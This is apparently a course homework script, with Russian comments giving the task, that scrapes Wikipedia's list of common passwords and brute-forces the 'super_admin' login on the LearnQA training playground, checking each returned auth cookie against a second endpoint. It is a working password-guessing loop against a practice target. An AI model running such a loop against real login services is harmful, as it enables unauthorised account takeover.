# Ex9*: Подбор пароля
# Сегодня к нам пришел наш коллега и сказал, что забыл свой пароль от важного сервиса.
# Он просит нас помочь ему написать программу, которая подберет его пароль.
# Условие следующее. Есть метод: https://playground.learnqa.ru/ajax/api/get_secret_password_homework
# Его необходимо вызывать POST-запросом с двумя параметрами: login и password.
# Если вызвать метод без поля login или указать несуществующий login, метод вернет 500
# Если login указан и существует, метод вернет нам авторизационную cookie с названием auth_cookie и каким-то значением.
#
# У метода существует защита от перебора. Если верно указано поле login, но передан неправильный password,
# то авторизационная cookie все равно вернется. НО с "неправильным" значением,
# которое на самом деле не позволит создавать авторизованные запросы.
# Только если и login, и password указаны верно, вернется cookie с "правильным" значением.
# Таким образом используя только метод get_secret_password_homework невозможно узнать, передали ли мы верный пароль или нет.
#
# По этой причине нам потребуется второй метод, который проверяет правильность нашей авторизованной cookie:
# https://playground.learnqa.ru/ajax/api/check_auth_cookie
#
# Если вызвать его без cookie с именем auth_cookie или с cookie, # у которой выставлено "неправильное" значение,
# метод вернет фразу "You are NOT authorized".
# Если значение cookie “правильное”, метод вернет: “You are authorized”
#
# Коллега говорит, что точно помнит свой login - это значение super_admin
# А вот пароль забыл, но точно помнит, что выбрал его из списка самых популярных паролей на Википедии (вот тебе и супер админ...).
# Ссылка: https://en.wikipedia.org/wiki/List_of_the_most_common_passwords
# Искать его нужно среди списка Top 25 most common passwords by year according to SplashData
#
# Итак, наша задача - написать скрипт и указать в нем login нашего коллеги и все пароли из Википедии в виде списка.
# Программа должна делать следующее:
#
# 1. Брать очередной пароль и вместе с логином коллеги вызывать первый метод get_secret_password_homework.
# В ответ метод будет возвращать авторизационную cookie с именем auth_cookie и каким-то значением.
#
# 2. Далее эту cookie мы должна передать во второй метод check_auth_cookie.
# Если в ответ вернулась фраза "You are NOT authorized", значит пароль неправильный.
# В этом случае берем следующий пароль и все заново.
# Если же вернулась другая фраза - нужно, чтобы программа вывела верный пароль и эту фразу.

import requests

response = requests.get('https://en.wikipedia.org/wiki/List_of_the_most_common_passwords')
# print(response.text)
html_text_1 = response.text.split('<th>2019<sup id="cite_ref-splashdata2019_13-0" class="reference"><a href="#cite_note-splashdata2019-13">&#91;13&#93;</a></sup>\n</th></tr>\n<tr>\n<td align="center">1\n</td>')[1]
html_text_2 = html_text_1.split('\n</td></tr></tbody></table>\n<h3><span class="mw-headline" id="Keeper">Keeper')[0]
html_text_3 = html_text_2.split('<td align="left">')
print(html_text_3)
passwords = []
for elem in html_text_3:
    value = elem.split('\n</td>')[0]
    if value not in passwords:
        passwords.append(value)
passwords = passwords[1:]
print(passwords)

for pass_word in passwords:
    payload = {"login": "super_admin", "password": pass_word}
    response1 = requests.post("https://playground.learnqa.ru/ajax/api/get_secret_password_homework", data=payload)
    cookie_value = response1.cookies.get('auth_cookie')
    cookies = {}
    if cookie_value is not None:
        cookies.update({'auth_cookie': cookie_value})
    response2 = requests.get("https://playground.learnqa.ru/api/check_auth_cookie", cookies=cookies)
    if response2.text != 'You are NOT authorized':
        print(f'{response2.text}! Your password is: {pass_word}')
        break
